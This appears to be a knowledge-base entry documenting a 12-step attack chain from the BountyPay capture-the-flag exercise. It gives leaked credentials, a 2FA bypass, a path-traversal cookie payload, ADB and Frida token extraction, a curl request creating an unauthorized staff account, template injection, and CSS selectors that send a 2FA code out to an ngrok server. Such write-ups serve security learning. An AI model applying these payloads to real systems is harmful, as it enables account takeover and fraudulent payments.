---
tags:
  - git-exposure
  - 2fa-bypass
  - open-redirect
  - path-traversal
  - apk-reverse-engineering
  - api-token-leak
  - authorization-bypass
  - template-injection
  - css-exfiltration
  - account-takeover
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
  - '[[tools/Turbo-Intruder]]'
  - '[[tools/JADX]]'
  - '[[tools/ADB]]'
  - '[[tools/Frida]]'
  - '[[tools/ngrok]]'
tactics:
  - '[[Reconnaissance]]'
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
  - '[[Privilege Escalation]]'
verified: false
platforms:
  - Web
  - Android
submitted: true
complexity: high
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Enumerate-Subdomains-of-Target-Domain]]'
  - '[[procedures/Brute-Force-Directories-for-Exposed-Resources]]'
  - '[[procedures/Access-and-Analyze-Exposed-Git-Repository]]'
  - '[[procedures/Login-and-Bypass-2FA-Using-Leaked-Credentials]]'
  - '[[procedures/Exploit-Open-Redirect-and-Path-Traversal]]'
  - '[[procedures/Download-and-Reverse-Engineer-APK]]'
  - '[[procedures/Extract-API-Token-from-APK-Using-ADB-and-Frida]]'
  - '[[procedures/Create-Unauthorized-Staff-Account-via-API]]'
  - '[[procedures/Escalate-Privileges-via-Template-Injection]]'
  - '[[procedures/Access-Admin-Features-and-Target-Account]]'
  - '[[procedures/Exfiltrate-2FA-Code-Using-CSS-Selectors]]'
  - '[[procedures/Perform-Unauthorized-Actions-as-Target-User]]'
step_count: 12
techniques:
  - '[[Gather Victim Host Information]]'
  - '[[Valid Accounts]]'
  - '[[Drive-by Compromise]]'
  - '[[Unsecured Credentials]]'
  - '[[Exploitation for Privilege Escalation]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:32:58.014Z'
description: >-
  A multi-stage attack exploiting exposed repositories, authentication
  weaknesses, internal access bypasses, mobile app secrets, privilege
  escalations, and CSS-based data exfiltration to achieve full account takeover
  and unauthorized payments in a web and Android environment.
skill_level: advanced
impact_level: critical
id: 34aa5668-b89c-4ca4-bd03-e7230dfe03c2
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Gather Victim Host Information]]'
  - '[[Valid Accounts]]'
  - '[[Drive-by Compromise]]'
  - '[[Unsecured Credentials]]'
  - '[[Exploitation for Privilege Escalation]]'
  - '[[JavaScript]]'
---
# Chained Vulnerabilities Leading to Account Takeover via Exposed Git, 2FA Bypass, APK Reverse Engineering, and CSS Exfiltration

Multi-stage attack chain demonstrating a complete workflow from reconnaissance to full account compromise in the BountyPay CTF environment, exploiting web and mobile vulnerabilities.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 12 |
| Execution Time | ~120 minutes |
| Skill Level | Advanced |
| Complexity | High |
| Impact Level | Critical |

## Attack Flow Visualization

```mermaid
graph LR
    A[Reconnaissance: Subdomains & Directories] --> B[Initial Access: Exposed Git & Credentials]
    B --> C[Authentication Bypass: 2FA Weakness]
    C --> D[Lateral Movement: Open Redirect & Path Traversal]
    D --> E[Discovery: APK Reverse Engineering & Token Extraction]
    E --> F[Privilege Escalation: Unauthorized Staff & Template Injection]
    F --> G[Exfiltration: CSS 2FA Bypass]
    G --> H[Impact: Account Takeover & Unauthorized Payments]

    style A fill:#e74c3c
    style B fill:#e74c3c
    style C fill:#f39c12
    style D fill:#f39c12
    style E fill:#3498db
    style F fill:#3498db
    style G fill:#9b59b6
    style H fill:#27ae60
```



## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]
- [[tools/Turbo-Intruder]]
- [[tools/JADX]]
- [[tools/ADB]]
- [[tools/Frida]]
- [[tools/ngrok]]

### Target Environment

- Web platform with PHP backend (nginx/1.15.8)
- Android APK hosted on internal subdomain
- Services: REST API, Firebase
- Ports: Standard HTTP/HTTPS (80/443)

### Initial Access Requirements

- No prior credentials needed
- Network access to public subdomains (e.g., bountypay.h1ctf.com)
- Rooted Android device for APK analysis

## Detailed Attack Procedures

### Step 1: Enumerate Subdomains
procedure: [[procedures/Enumerate-Subdomains-of-Target-Domain]]

**Objective**: Identify live subdomains to expand the attack surface.

**Instructions**: Use [[commands/turbo-intruder-subdomain-enum]] with Burp Suite and a wordlist to scan for subdomains under *.bountypay.h1ctf.com.

```bash
# Configured in Turbo Intruder within Burp Suite
```

**Expected Output**: List of subdomains like app.bountypay.h1ctf.com.

**Success Indicators**:
- Multiple subdomains discovered
- app.bountypay.h1ctf.com confirmed live

### Step 2: Brute Force Directories
procedure: [[procedures/Brute-Force-Directories-for-Exposed-Resources]]

**Objective**: Discover hidden directories and exposed files.

**Instructions**: Employ [[commands/turbo-intruder-directory-brute]] with SecLists wordlist in Burp to find .git/HEAD and .git/config on app.bountypay.h1ctf.com.

```bash
# Turbo Intruder payload in Burp: fuzz directories
```

**Expected Output**: Exposed .git/config revealing GitHub repo URL.

**Success Indicators**:
- .git directory found
- Config file accessible

### Step 3: Access Exposed Git Repository
procedure: [[procedures/Access-and-Analyze-Exposed-Git-Repository]]

**Objective**: Extract credentials from leaked logs.

**Instructions**: Clone the repo from .git/config and decode the log file manually or via browser.

**Expected Output**: Credentials: username brian.oliver, password V7h0inzX, challenge_answer bD83Jk27dQ.

**Success Indicators**:
- Log file base64 decoded successfully
- Valid credentials obtained

### Step 4: Login and Bypass 2FA
procedure: [[procedures/Login-and-Bypass-2FA-Using-Leaked-Credentials]]

**Objective**: Gain authenticated session.

**Instructions**: Login at app.bountypay.h1ctf.com using credentials, intercept 2FA in Burp Repeater, compute MD5 of challenge_answer as new challenge.

```bash
# MD5 computation: echo -n 'bD83Jk27dQ' | md5sum
```

**Expected Output**: Valid session cookie.

**Success Indicators**:
- Login successful
- 2FA bypassed

### Step 5: Exploit Open Redirect and Path Traversal
procedure: [[procedures/Exploit-Open-Redirect-and-Path-Traversal]]

**Objective**: Access internal subdomain.

**Instructions**: Modify account_id cookie to '../../redirect?url=https://software.bountypay.h1ctf.com/?' via /statements, brute /uploads for APK.

**Expected Output**: Access to software.bountypay.h1ctf.com/uploads/BountyPay.apk.

**Success Indicators**:
- Internal redirect successful
- APK downloadable

### Step 6: Download and Reverse Engineer APK
procedure: [[procedures/Download-and-Reverse-Engineer-APK]]

**Objective**: Analyze mobile app for secrets.

**Instructions**: Download APK, run [[commands/jadx-gui-decompile]] to view source and AndroidManifest.xml.

```bash
jadx-gui BountyPay.apk
```

**Expected Output**: Decompiled code revealing deep links.

**Success Indicators**:
- Deep links identified
- APK installed on device

### Step 7: Extract API Token from APK
procedure: [[procedures/Extract-API-Token-from-APK-Using-ADB-and-Frida]]

**Objective**: Retrieve hardcoded API token.

**Instructions**: Install APK with [[commands/adb-install-apk]], launch activities via deep links using [[commands/adb-shell-am-start-one]], [[commands/adb-shell-am-start-two]], [[commands/adb-shell-am-start-three]], hook with [[commands/frida-attach-script]], input token with [[commands/adb-shell-input-text]], monitor with [[commands/adb-logcat]].

```bash
adb install -r -t BountyPay.apk
adb shell am start -a "android.intent.action.VIEW" -d "one://part/?start=PartTwoActivity"
frida -U -l bounty_app.js --no-pause -f bounty.pay
adb logcat
```

**Expected Output**: Token: 8e9998ee3137ca9ade8f372739f062c1, API: http://api.bountypay.h1ctf.com.

**Success Indicators**:
- Token extracted
- API endpoint confirmed

### Step 8: Create Unauthorized Staff Account
procedure: [[procedures/Create-Unauthorized-Staff-Account-via-API]]

**Objective**: Gain staff privileges.

**Instructions**: POST to /api/staff with X-Token header and staff_id=STF:84DJKEIP38 using [[commands/curl-create-staff]].

```bash
curl -X POST 'https://api.bountypay.h1ctf.com/api/staff' -H 'X-Token: 8e9998ee3137ca9ade8f372739f062c1' -d 'staff_id=STF:84DJKEIP38'
```

**Expected Output**: New staff account for sandra.allison.

**Success Indicators**:
- Account created
- Staff login possible

### Step 9: Escalate Privileges via Template Injection
procedure: [[procedures/Escalate-Privileges-via-Template-Injection]]

**Objective**: Trick admin into upgrading account.

**Instructions**: Login as staff, inject via ?template[]=login&username=sandra.allison&template[]=ticket&ticket_id=3582#tab1, report base64 URL to /admin/report.

**Expected Output**: Admin upgrade triggered.

**Success Indicators**:
- Template chaining works
- Privileges escalated

### Step 10: Access Admin Features and Target Account
procedure: [[procedures/Access-Admin-Features-and-Target-Account]]

**Objective**: Impersonate target user.

**Instructions**: As admin, login to marten.mickos using admin tab password, prepare for 2FA bypass.

**Expected Output**: Access to target account dashboard.

**Success Indicators**:
- Admin panel accessible
- Target login initiated

### Step 11: Exfiltrate 2FA Code Using CSS
procedure: [[procedures/Exfiltrate-2FA-Code-Using-CSS-Selectors]]

**Objective**: Bypass final 2FA.

**Instructions**: Start [[commands/ngrok-tunnel-http]] for local server, set app_style to ngrok URL with CSS selectors input[name=code_%d][value='%s'] { background:url(/hit?char=%s&position=%d); }.

```bash
./ngrok http 8080
```

**Expected Output**: Exfiltrated code 'pzZ3ZDZ'.

**Success Indicators**:
- CSS requests received
- Full 2FA code reconstructed

### Step 12: Perform Unauthorized Actions
procedure: [[procedures/Perform-Unauthorized-Actions-as-Target-User]]

**Objective**: Achieve impact.

**Instructions**: Load 05/2020 transactions and pay pending bounties.

**Expected Output**: Bounties paid unauthorized.

**Success Indicators**:
- Transactions manipulated
- Account fully compromised

## Attack Chain Summary

### Key Achievements

1. Full reconnaissance and exposure discovery
2. Chained bypasses leading to internal access
3. Mobile app exploitation for credentials
4. Privilege escalation and exfiltration for takeover

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Gather Victim Host Information]] Gather Victim Host Information
- [[Valid Accounts]] Valid Accounts
- [[Drive-by Compromise]] Drive-by Compromise
- [[Unsecured Credentials]] Unsecured Credentials
- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation
- [[JavaScript]] JavaScript (for injection analogs)

### MITRE ATT&CK Tactics

- [[Reconnaissance]] Reconnaissance
- [[Initial Access]] Initial Access
- [[Lateral Movement]] Lateral Movement
- [[Privilege Escalation]] Privilege Escalation

---

*Last updated: 2023-10-01T00:00:00Z*
